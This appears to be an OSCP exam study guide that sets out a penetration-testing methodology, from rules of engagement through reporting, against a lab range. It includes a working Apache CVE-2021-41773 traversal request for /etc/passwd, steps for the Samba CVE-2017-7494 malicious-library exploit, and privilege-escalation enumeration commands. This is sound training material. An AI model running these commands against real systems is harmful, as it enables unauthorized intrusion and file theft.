# Practical Penetration Testing Methodology Example

This document provides a practical example of a penetration testing methodology that you can follow during the OSCP exam and in real-world scenarios.

## Sample Penetration Test Workflow

### 1. Pre-Engagement

**Example Documentation: Rules of Engagement**

```
Target IP Range: 10.11.1.0/24
Testing Window: 2023-08-20 08:00 - 2023-08-21 08:00 UTC
Authorized Testing Activities:
- Network scanning
- Vulnerability assessment
- Exploitation attempts
- Privilege escalation
- Limited lateral movement (within scope)
Prohibited Activities:
- Denial of Service attacks
- Social engineering against personnel
- Physical security testing
- Destructive testing
Point of Contact: security@example.com
Emergency Contact: +1-555-123-4567
```

### 2. Information Gathering

**Example Commands:**

```bash
# Passive Reconnaissance
whois example.com
host example.com
dig example.com ANY
theHarvester -d example.com -b google,linkedin

# Active Reconnaissance
nmap -sS -A -T4 -p- 10.11.1.10
nmap -sU -T4 --top-ports 100 10.11.1.10
nmap -sV --script=banner 10.11.1.10
```

### 3. Vulnerability Assessment

**Example Findings Documentation:**

| IP Address  | Port | Service | Version | Vulnerability | CVE |
|-------------|------|---------|---------|---------------|-----|
| 10.11.1.10  | 80   | HTTP    | Apache 2.4.29 | Directory Traversal | CVE-2021-41773 |
| 10.11.1.10  | 22   | SSH     | OpenSSH 7.6p1 | None Identified | N/A |
| 10.11.1.10  | 445  | SMB     | Samba 4.5.16  | Remote Code Execution | CVE-2017-7494 |

### 4. Exploitation

**Example Exploitation Plan:**

1. Target: Web Server (10.11.1.10:80)
   - Vulnerability: Directory Traversal (CVE-2021-41773)
   - Exploit: Custom Python script to extract /etc/passwd
   - Expected Outcome: File read access

2. Target: SMB Server (10.11.1.10:445)
   - Vulnerability: Remote Code Execution (CVE-2017-7494)
   - Exploit: Metasploit module or manual exploitation
   - Expected Outcome: Shell access

**Example Exploitation Command:**
```bash
# Manual exploitation of Apache directory traversal
curl -s --path-as-is "http://10.11.1.10/cgi-bin/.%2e/%2e%2e/%2e%2e/%2e%2e/etc/passwd"

# Manual SMB exploitation
# Create malicious .so file
gcc -o evil.so -shared evil.c -fPIC
# Upload to writeable share
smbclient //10.11.1.10/share -U username
put evil.so
# Trigger the exploit
python3 samba_exploit.py 10.11.1.10 evil.so
```

### 5. Post-Exploitation

**Example Commands:**

```bash
# Linux Privilege Escalation
id
uname -a
cat /etc/passwd
find / -perm -u=s -type f 2>/dev/null
sudo -l

# Windows Privilege Escalation
whoami /all
systeminfo
wmic qfe get Caption,Description,HotFixID,InstalledOn
accesschk.exe -uwcqv "Authenticated Users" *
```

### 6. Documentation

**Example Report Structure:**

1. Executive Summary
2. Methodology
3. Findings
   - High Risk Vulnerabilities
   - Medium Risk Vulnerabilities
   - Low Risk Vulnerabilities
4. Exploitation Proof of Concept
5. Recommendations
6. Appendices
   - Tools Used
   - Command Logs
   - Screenshots

## OSCP-Specific Notes

For the OSCP exam, remember:

1. **Document as you go**: Take screenshots and notes of every significant step
2. **Track your progress**: Keep a checklist of machines and points
3. **Manage time**: Set time limits for each target
4. **Maintain persistence**: If stuck, rotate to another target and return later
5. **Verify exploits**: Test exploits in a controlled environment before using them

## Exercise: Create Your Own Methodology

Using this example as a guide, create your own detailed penetration testing methodology that you can follow during the OSCP exam. Customize it based on your strengths and preferences, but ensure it covers all the essential phases of a penetration test.
